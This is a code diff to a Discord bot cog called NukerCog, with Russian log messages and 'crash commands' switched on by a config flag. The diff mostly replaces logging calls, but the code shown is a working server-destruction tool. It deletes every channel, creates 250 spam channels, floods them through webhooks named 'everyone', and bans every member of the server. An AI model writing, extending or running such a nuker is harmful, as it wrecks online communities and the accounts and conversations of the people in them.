@@ -3,28 +3,28 @@ from asyncio import create_task
 from colorama import Fore
 from discord.ext import commands
 
-from Commands.logger import log
+from Commands.logger import log_error
 
 
 async def DELETE(obj):
     try:
         await obj.delete()
     except Exception as e:
-        log(f'DELETE: {e}', 'ОШИБКА', Fore.RED, 1)
+        log_error(f'DELETE: {e}', 'ОШИБКА', 1)
 
 
 async def CREATE_ROLE(guild, name):
     try:
         await guild.create_role(name=name)
     except Exception as e:
-        log(f'CREATE_ROLE: {e}', 'ОШИБКА', Fore.RED, 1)
+        log_error(f'CREATE_ROLE: {e}', 'ОШИБКА', 1)
 
 
 async def SPAM_WEBHOOK(channel, message):
     try:
         webhook = await channel.create_webhook(name='everyone')
     except Exception as e:
-        log(f'SPAM_WEBHOOK: {e}', 'ОШИБКА', Fore.RED, 1)
+        log_error(f'SPAM_WEBHOOk: {e}', 'ОШИБКА', 1)
         return
 
     while True:
@@ -35,7 +35,7 @@ async def CREATE_CHANNEL(guild, name, spam=False, message=None):
     try:
         channel = await guild.create_text_channel(name=name)
     except Exception as e:
-        log(f'CREATE_CHANNEL: {e}', 'ОШИБКА', Fore.RED, 1)
+        log_error(f'CREATE_CHANNEL: {e}', 'ОШИБКА', 1)
         return
 
     if spam:
@@ -46,7 +46,7 @@ async def BAN(member):
     try:
         await member.ban()
     except Exception as e:
-        log(f'BAN: {e}', 'ОШИБКА', Fore.RED, 1)
+        log_error(f'BAN: {e}', 'ОШИБКА', 1)
 
 
 class NukerCog(commands.Cog):
@@ -60,8 +60,8 @@ class NukerCog(commands.Cog):
             return
 
         if not self.bot.config['ENABLE_CRASH']:
-            log('Краш-команды не включены, включите их в config.json',
-                'ОШИБКА', Fore.RED, 1)
+            log_error(f'Краш-команды не включены. Включите их в Config.JSON',
+                      'ОШИБКА', 1)
             return
 
         await ctx.message.delete()
@@ -75,8 +75,8 @@ class NukerCog(commands.Cog):
             return
 
         if not self.bot.config['ENABLE_CRASH']:
-            log('Краш-команды не включены, включите их в config.json',
-                'ОШИБКА', Fore.RED, 1)
+            log_error(f'Краш-команды не включены. Включите их в Config.JSON',
+                      'ОШИБКА', 1)
             return
 
         await ctx.message.delete()
@@ -90,8 +90,8 @@ class NukerCog(commands.Cog):
             return
 
         if not self.bot.config['ENABLE_CRASH']:
-            log('Краш-команды не включены, включите их в config.json',
-                'ОШИБКА', Fore.RED, 1)
+            log_error(f'Краш-команды не включены. Включите их в Config.JSON',
+                      'ОШИБКА', 1)
             return
 
         await ctx.message.delete()
@@ -105,8 +105,8 @@ class NukerCog(commands.Cog):
             return
 
         if not self.bot.config['ENABLE_CRASH']:
-            log('Краш-команды не включены, включите их в config.json',
-                'ОШИБКА', Fore.RED, 1)
+            log_error(f'Краш-команды не включены. Включите их в Config.JSON',
+                      'ОШИБКА', 1)
             return
 
         await ctx.message.delete()
@@ -120,8 +120,8 @@ class NukerCog(commands.Cog):
             return
 
         if not self.bot.config['ENABLE_CRASH']:
-            log('Краш-команды не включены, включите их в config.json',
-                'ОШИБКА', Fore.RED, 1)
+            log_error(f'Краш-команды не включены. Включите их в Config.JSON',
+                      'ОШИБКА', 1)
             return
 
         await ctx.message.delete()
@@ -135,8 +135,8 @@ class NukerCog(commands.Cog):
             return
 
         if not self.bot.config['ENABLE_CRASH']:
-            log('Краш-команды не включены, включите их в config.json',
-                'ОШИБКА', Fore.RED, 1)
+            log_error(f'Краш-команды не включены. Включите их в Config.JSON',
+                      'ОШИБКА', 1)
             return
 
         await ctx.message.delete()
@@ -150,8 +150,8 @@ class NukerCog(commands.Cog):
             return
 
         if not self.bot.config['ENABLE_CRASH']:
-            log('Краш-команды не включены, включите их в config.json',
-                'ОШИБКА', Fore.RED, 1)
+            log_error(f'Краш-команды не включены. Включите их в Config.JSON',
+                      'ОШИБКА', 1)
             return
 
         await ctx.message.delete()
@@ -165,8 +165,8 @@ class NukerCog(commands.Cog):
             return
 
         if not self.bot.config['ENABLE_CRASH']:
-            log('Краш-команды не включены, включите их в config.json',
-                'ОШИБКА', Fore.RED, 1)
+            log_error(f'Краш-команды не включены. Включите их в Config.JSON',
+                      'ОШИБКА', 1)
             return
 
         await ctx.message.delete()
@@ -180,8 +180,8 @@ class NukerCog(commands.Cog):
             return
 
         if not self.bot.config['ENABLE_CRASH']:
-            log('Краш-команды не включены, включите их в config.json',
-                'ОШИБКА', Fore.RED, 1)
+            log_error(f'Краш-команды не включены. Включите их в Config.JSON',
+                      'ОШИБКА', 1)
             return
 
         await ctx.message.delete()
@@ -190,8 +190,7 @@ class NukerCog(commands.Cog):
             create_task(DELETE(channel))
 
         for _ in range(250):
-            create_task(CREATE_CHANNEL(ctx.guild, names, True,
-                                       message))  # TODO: fix
+            create_task(CREATE_CHANNEL(ctx.guild, names, True, message))
 
         for member in ctx.guild.members:
             create_task(BAN(member))
